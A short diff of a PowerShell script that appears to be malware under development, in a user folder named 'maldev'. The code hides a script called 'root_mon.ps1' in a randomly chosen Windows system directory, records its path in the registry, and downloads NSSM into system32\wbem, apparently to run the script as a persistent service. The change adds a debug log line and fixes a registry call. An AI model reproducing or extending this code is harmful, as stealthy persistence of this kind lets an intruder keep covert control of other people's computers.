@@ -11,7 +11,7 @@ $paths = @(
     "$env:windir\System32\drivers\etc",
     "$env:windir\System32\LogFiles\WMI"
 )
-
+echo $basePath >> "C:\Users\maldev\Downloads\init_root_mon.txt"
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
@@ -21,7 +21,7 @@ if(($scriptPath -eq $null) -or ($scriptPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $scriptPath = $paths[$idx]
     $scriptPath = "$scriptPath\root_mon.ps1"
-    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $scriptPath -Force | Out-Null
+    Set-ItemProperty -Path $basePath -Name $propertyName -Value $scriptPath -Force | Out-Null
 }
 
 if(($rootPath -eq $null) -or ($rootPath -eq "")){
